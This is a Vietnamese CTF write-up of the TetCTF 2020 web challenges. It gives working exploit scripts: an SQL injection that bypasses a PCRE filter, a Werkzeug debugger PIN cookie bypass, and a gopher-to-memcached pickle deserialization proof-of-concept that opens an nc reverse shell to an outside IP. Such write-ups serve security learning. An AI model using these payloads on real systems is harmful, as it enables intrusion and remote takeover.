\u0026lt;form action=\u0026#34;index.php\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;id\u0026#34; value=\u0026#34;\u0026#34;/\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Submit\u0026#34;/\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/center\u0026gt; \u0026lt;?php if (isset($_POST[\u0026#39;id\u0026#39;]) \u0026amp;\u0026amp; !empty($_POST[\u0026#39;id\u0026#39;])) { if (preg_match(\u0026#39;/and|or|in|if|case|sleep|benchmark/is\u0026#39;, $_POST[\u0026#39;id\u0026#39;])) { die(\u0026#39;Tet nhat ai lai hack nhau :(, very dangerous key word\u0026#39;); } elseif (preg_match(\u0026#39;/order.+?by|union.+?select/is\u0026#39;, $_POST[\u0026#39;id\u0026#39;])) { die(\u0026#39;Tet nhat ai lai hack nhau :(, very dangerous statement\u0026#39;); } else { $user = mysqli_query($conn, \u0026#34;SELECT * FROM users WHERE id=\u0026#34; . $_POST[\u0026#39;id\u0026#39;])-\u0026gt;fetch_assoc()[\u0026#39;username\u0026#39;]; if ($user !== \u0026#39;admin\u0026#39;) { echo \u0026#39;Hello \u0026#39; . htmlentities($user); if ($user === \u0026#39;admin\u0026#39;) { echo \u0026#39;This can\\\u0026#39;t be =]] Just put here for fun lul\u0026#39;; die($flag); } } } } ?\u0026gt; Dòng 4 chúng ta có 1 hint của tác giả là phải sử dụng SQL Injection và leak được flag ở 1 column Y và table X nào đó mà chúng ta chưa biết trong database.\nChúng ta bị chặn sử dụng câu lệnh order by và union select, đặc biệt lưu ý là cụm in cũng bị chặn, điều này dẫn đến sẽ có đôi chút khó khăn để ta lấy được table name và column name từ information_schema cũng như các database có prefix innodb.\nNhưng chúng ta có thể bypass preg_match ở dòng 21 bằng cách làm cho PCRE (Engine xử lí Regular Expression trong PHP) xử lí input của ta, làm cho vượt quá backtrack limit mặc định của PHP. Bằng cách này, chúng ta có thể sử dụng order by hay union select dễ dàng.\nGet table name Mình quyết định sử dụng view x$ps_schema_table_statistics_io có trong database sys vì theo như MySQL documentation mô tả:\nThese views summarize table statistics. By default, rows are sorted by descending total wait time (tables with most contention first). và trong view này cũng có chứa 2 columns là table_schema và table_name.\nres = requests.post(\u0026#39;http://45.77.240.178:8002/index.php\u0026#39;, data={ \u0026#39;id\u0026#39;: \u0026#39;5 union/*\u0026#39; + \u0026#39;a\u0026#39;*1000000 + \u0026#39;*/select 1,group_concat(table_name),3 from sys.x$ps_schema_table_statistics_io where table_schema=database()\u0026#39; }) Table name: Th1z_Fack1n_Fl4444g_Tabl3\nGet flag without knowing column name Cách này đã được anh @tsug0d mô tả cực kì chi tiết và dễ hiểu trong blog của anh nên mình không dài dòng nữa. Get flag thôi!\nres = requests.post(\u0026#39;http://45.77.240.178:8002/index.php\u0026#39;, data={ \u0026#39;id\u0026#39;: \u0026#39;5 union/*\u0026#39; + \u0026#39;a\u0026#39;*1000000 + \u0026#39;*/select 1,b,3 from (select 1 a, 2 b union select * from Th1z_Fack1n_Fl4444g_Tabl3 limit 1,1)x\u0026#39; }) Another way from the author 🎉🎉🎉\nThe Prophet Wohoo, wanna hear some oracle? Bài này chỉ có 1 chức năng cơ bản là đọc các file text có tên từ 1 - 5. Khi ta thử file 6.txt, trang xuất hiện giao diện thông báo lỗi của Flask, chứng tỏ debug mode đang được enabled. Trong giao diện báo lỗi, chúng ta có thể đọc 1 phần source code đã bị disclosed:\nTa dễ dàng thấy được lỗi Local File Inclusion (LFI) trong đoạn code xử lí đọc file này. Biến filename được truyền thẳng đến hàm open() và nội dung được đưa ra ngoài thông qua hàm render_template().\nNgay lúc này, mình nhận ra rằng việc chúng ta có lỗi LFI sẽ dẫn đến việc có thể generate được debugger PIN code, sau đó sử dụng chức năng Interactive shell được tích hợp trong giao diện lỗi của Flask để có thể leverage lên RCE.\nSau khi làm theo bài hướng dẫn generate PIN code và đã có được PIN, giờ chỉ việc submit PIN và RCE thôi, nhưng đời không như mơ và cuộc sống không dễ thở\u0026hellip;\nOk, tự trong đầu nghĩ chắc đây cũng là ý của tác giả thôi, chắc có chỗ nào đâu đó trong phần xử lí nhập PIN này có thể vượt được, let check it out. 🧐\n# https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/__init__.py # ... def hash_pin(pin): if isinstance(pin, text_type): pin = pin.encode(\u0026#34;utf-8\u0026#34;, \u0026#34;replace\u0026#34;) return hashlib.md5(pin + b\u0026#34;shittysalt\u0026#34;).hexdigest()[:12] # ... class DebuggedApplication(object): # ... def check_pin_trust(self, environ): \u0026#34;\u0026#34;\u0026#34;Checks if the request passed the pin test. This returns `True` if the request is trusted on a pin/cookie basis and returns `False` if not. Additionally if the cookie\u0026#39;s stored pin hash is wrong it will return `None` so that appropriate action can be taken. \u0026#34;\u0026#34;\u0026#34; if self.pin is None: return True val = parse_cookie(environ).get(self.pin_cookie_name) if not val or \u0026#34;|\u0026#34; not in val: return False ts, pin_hash = val.split(\u0026#34;|\u0026#34;, 1) if not ts.isdigit(): return False if pin_hash != hash_pin(self.pin): return None return (time.time() - PIN_TIME) \u0026lt; int(ts) def pin_auth(self, request): \u0026#34;\u0026#34;\u0026#34;Authenticates with the pin.\u0026#34;\u0026#34;\u0026#34; exhausted = False auth = False trust = self.check_pin_trust(request.environ) # If the trust return value is `None` it means that the cookie is # set but the stored pin hash value is bad. This means that the # pin was changed. In this case we count a bad auth and unset the # cookie. This way it becomes harder to guess the cookie name # instead of the pin as we still count up failures. bad_cookie = False if trust is None: self._fail_pin_auth() bad_cookie = True # If we\u0026#39;re trusted, we\u0026#39;re authenticated. elif trust: auth = True # If we failed too many times, then we\u0026#39;re locked out. elif self._failed_pin_auth \u0026gt; 10: exhausted = True # Otherwise go through pin based authentication else: entered_pin = request.args.get(\u0026#34;pin\u0026#34;) if entered_pin.strip().replace(\u0026#34;-\u0026#34;, \u0026#34;\u0026#34;) == self.pin.replace(\u0026#34;-\u0026#34;, \u0026#34;\u0026#34;): self._failed_pin_auth = 0 auth = True else: self._fail_pin_auth() rv = Response( json.dumps({\u0026#34;auth\u0026#34;: auth, \u0026#34;exhausted\u0026#34;: exhausted}), mimetype=\u0026#34;application/json\u0026#34;, ) if auth: rv.set_cookie( self.pin_cookie_name, \u0026#34;%s|%s\u0026#34; % (int(time.time()), hash_pin(self.pin)), httponly=True, ) elif bad_cookie: rv.delete_cookie(self.pin_cookie_name) return rv # ... Hai dòng được highlight là câu lệnh if kiểm tra điều kiện nếu nhập sai quá 10 lần thì exhausted = True, từ đó ta suy ra đã có người submit sai PIN khoảng 7 - 8 lần trước đó, để đến lượt mình thì sau khi thử 2 - 3 mã PIN thì nó lên 10. 😤\nOk, quay lại nào. Vì câu điều kiện check nhập sai nằm trong nhánh elif nên chỉ cần 2 câu điều kiện ở trên đúng thì sẽ không thực thi. Biến trust được khởi tạo với value là return value của hàm check_pin_trust(), hàm này thực hiện get và parse cookie, kiểm tra PIN hash trong cookie có đúng với PIN hash trên server hay không, PIN expired time có hết hạn hay chưa.\nVì chúng ta có thể control được cookie nên ta có thể tùy biến được cookie để vượt qua được việc check exhausted. Mình đã có quyền chạy Python code trên interactive shell rồi, tìm và đọc flag rất dễ dàng.\nAuthor nói gì? Ok, giải xong inbox author thì ảnh bảo chỉ cần generate PIN code là xong rồi RCE lấy flag thôi, tại lúc đó setup có vấn đề nên mới bị exhausted. 😤\nMeePwnTube2050 Source: https://drive.google.com/file/d/12MZJiMUCmLJ84-NypWByEzezkz4fx9RA/view Bài này mình stuck đến ngày hôm sau mới nghĩ được hướng 😅\nVì mình ngâm đi ngâm lại source code nhiều lần để chắc chắn rằng không có 1 lỗi nào có thể xảy ra, và đến khi mình chợt để ý 1 chi tiết nhỏ trong search.php:\n\u0026lt;?php include \u0026#34;dbconnect.php\u0026#34;; $_IP = $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]; if (isset($_GET[\u0026#39;search\u0026#39;])) { if ($_IP === \u0026#34;45.76.148.212\u0026#34;){ //local only homie $Name = $_GET[\u0026#39;search\u0026#39;]; $_search = mysqli_real_escape_string($admin_conn,$Name); $Execquery = mysqli_query($admin_conn, \u0026#34;SELECT id,Name FROM search WHERE Name LIKE \u0026#39;%$_search%\u0026#39; LIMIT 8\u0026#34;); while ($Result = mysqli_fetch_array($Execquery)) { echo \u0026#34;\u0026lt;center\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;b\u0026gt;\u0026lt;p style=\u0026#39;font-size:20px; color:green\u0026#39;\u0026gt;\u0026#34;.$Result[\u0026#39;Name\u0026#39;].\u0026#34;\u0026lt;/p\u0026gt;\u0026lt;/b\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;iframe src=\u0026#39;video\u0026#34;.$Result[\u0026#39;id\u0026#39;].\u0026#34;.php\u0026#39; width=\u0026#39;1200\u0026#39; height=\u0026#39;300\u0026#39;\u0026gt;\u0026lt;/iframe\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/center\u0026gt;\u0026#34;; } } else { $Name = $_GET[\u0026#39;search\u0026#39;]; $_search = mysqli_real_escape_string($conn,$Name); $Execquery = mysqli_query($conn, \u0026#34;SELECT id,Name FROM search WHERE Name LIKE \u0026#39;%$_search%\u0026#39; LIMIT 8\u0026#34;); while ($Result = mysqli_fetch_array($Execquery)) { echo \u0026#34;\u0026lt;center\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;b\u0026gt;\u0026lt;p style=\u0026#39;font-size:20px; color:green\u0026#39;\u0026gt;\u0026#34;.$Result[\u0026#39;Name\u0026#39;].\u0026#34;\u0026lt;/p\u0026gt;\u0026lt;/b\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;iframe src=\u0026#39;video\u0026#34;.$Result[\u0026#39;id\u0026#39;].\u0026#34;.php\u0026#39; width=\u0026#39;1200\u0026#39; height=\u0026#39;300\u0026#39;\u0026gt;\u0026lt;/iframe\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/center\u0026gt;\u0026#34;; } } } ?\u0026gt; Tại dòng 10 nếu IP là 45.76.148.212 (cũng là IP của bot) thì nó sẽ lấy giá trị từ DB_ADMIN chứ không phải lấy giá trị từ DB thường. Từ đó làm mình nghĩ ngay tới bài secret note keeper trong giải Facebook CTF 2019 mà anh @ducnt đã giải và viết writeup trước đó.\nPhần còn lại để các bạn trả lời\u0026hellip; 😪\nHelloVietNamv2 https://www.youtube.com/watch?v=ZqjhmdRgXMw\nSource: https://drive.google.com/file/d/142pMCn8qU565sQWOTsFALLEtjfjtbijs/view Bài này cũng là 1 bài bị setup lỗi, dẫn đến nhiều team trong đó có mình giải theo hướng unintended (Command Injection) thay vì intended (Memcached Injection). Trong phần này mình sẽ chỉ nói về cách intended của tác giả.\nWhere\u0026rsquo;s the real bug in the source code? # ... @app.route(\u0026#39;/loadexternalvideo\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def loadexternalvideo(): if session.get(\u0026#39;user\u0026#39;): if request.method == \u0026#39;POST\u0026#39;: # ... _url = request.form[\u0026#39;video_url\u0026#39;] # ... file = parse(_url) # ... # ... Nếu các bạn để ý tại hàm xử lí route /loadexternalvideo sẽ thấy 1 lỗi SSRF. Hàm parse() sử dùng PyCurl để request. Theo như documentation thì PyCurl là 1 interface của libcurl và đây là những protocol libcurl hỗ trợ:\nVậy là chúng ta có thể sử dụng Gopher protocol, sound good!\nVậy Memcached Injection nằm ở đâu? Nằm ở chỗ sử dụng thư viện pylibmc trong Python. Nếu ai đã đọc qua slide được trình bày tại hội nghị Black Hat thì cũng đã thấy cái table này:\nChúng ta có thể thấy, nếu dữ liệu chúng ta set vào key là 1 Pickle serialized data thì khi get cái key này, tùy theo flags mà chúng ta gửi lên mà pylibmc có deserialize Pickle hay không.\nFlag for Pickle deserialization: (1 \u0026lt;\u0026lt; 0) = 1\nVậy chúng ta trigger được payload bằng cách nào? Cùng xem lại đoạn code sau:\ndef racingboiz101(_key, _value): _speedup101 = pylibmc.Client([\u0026#34;127.0.0.1:11211\u0026#34;], binary=False) if _speedup101.get(_key) == None: _speedup101.set(_key, \u0026#34;Copyright@HelloVietNamv2\u0026#34;, time=60) _speedup101.set(_value, _value, time=60) return _speedup101.get(_key), _speedup101.get(_value) else: _speedup101.set(_value, _value, time=60) return _speedup101.get(_key), _speedup101.get(_value) Vậy để trigger được thì chúng ta cần phải get được key mà ta đã set cho Memcached trước đó thông qua Gopher protocol.\nExploit Dùng Gopher protocol request đến Memcached để set 1 key với tên bất kì (gọi key này tên là this_is_key) với value là pickle serialized data (aka payload) của chúng ta. Sau đó gọi đến route /GIFmaker để trigger cái key này.\nMemcached command của chúng ta như sau:\nset this_is_key 1 10 \u0026lt;payload_length\u0026gt; \u0026lt;payload\u0026gt; this_is_key - là tên key mà chúng ta muốn set. 1 - đây là tham số flags, dùng để cho pylibmc biết khi get key này sẽ phải deserialize bằng Pickle. 10 - expired time, tính bằng giây. \u0026lt;payload_length\u0026gt; và \u0026lt;payload\u0026gt; thì chắc không cần phải giải thích nữa. Proof-of-concept from time import time from os import system import urllib import pickle import requests import random import sys ALPHA = \u0026#34;abcdefghijklmnopqrstuvwxyz\u0026#34; def rand_string(length): return \u0026#39;\u0026#39;.join([random.choice(ALPHA) for _ in range(length)]) class Exploit(object): def __reduce__(self): return system, (\u0026#39;rm -f /tmp/f; mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2\u0026gt;\u0026amp;1 | nc 3.0.119.151 3000 \u0026gt; /tmp/f\u0026#39;,) title = rand_string(6) payload = pickle.dumps(Exploit()) payload = [ \u0026#39;\u0026#39;, \u0026#39;set %s 1 10 %d\u0026#39; % (title, len(payload)), payload, \u0026#39;\u0026#39; ] print \u0026#39;Start requesting...\u0026#39; try: res = requests.post(\u0026#39;http://hellovietnamv2.0x1337.space:31337/loadexternalvideo\u0026#39;, data={ \u0026#39;inputTitle\u0026#39;: rand_string(6), \u0026#39;inputDescription\u0026#39;: \u0026#39;description\u0026#39;, \u0026#39;video_url\u0026#39;: \u0026#39;gopher://127.0.0.1:11211/_\u0026#39; + urllib.quote(\u0026#39;\\r\\n\u0026#39;.join(payload)), \u0026#39;timestamp\u0026#39;: int(time()) - 2 }, cookies={ \u0026#39;session\u0026#39;: \u0026#39;redacted\u0026#39; }, timeout=3) print res.content except: pass print \u0026#39;Done!\u0026#39; print \u0026#39;Start triggering payload...\u0026#39; try: res = requests.post(\u0026#39;http://hellovietnamv2.0x1337.space:31337/GIFmaker\u0026#39;, data={ \u0026#39;inputTitle\u0026#39;: title, \u0026#39;inputDescription\u0026#39;: \u0026#39;description\u0026#39;, \u0026#39;filePath\u0026#39;: \u0026#39;static/Uploads/aa587ed19a228d98431f142900b60633.mp4\u0026#39;, \u0026#39;timestamp\u0026#39;: int(time()) - 2 }, cookies={ \u0026#39;session\u0026#39;: \u0026#39;redacted\u0026#39; }, timeout=3) print res.content except: pass print \u0026#39;Done, exit program!\u0026#39; Last words Cảm ơn 2 anh @ducnt và @tsug0d đã tạo ra những đề Web hay ho cho dịp đầu năm 2020, support nhiệt tình cho em để có thể giải được hết tất cả các Web challenge cũng như nhằm ôn lại những kiến thức đã được học trong năm 2019 đã qua.\nChúc mừng năm mới 2️⃣0️⃣2️⃣0️⃣ everyone!\n","permalink":"https://blog.undo.pw/posts/tetctf-2020-web-writeup/","summary":"Writeup for all the Web challenges in TetCTF 2020","title":"TetCTF 2020 Web writeup"}]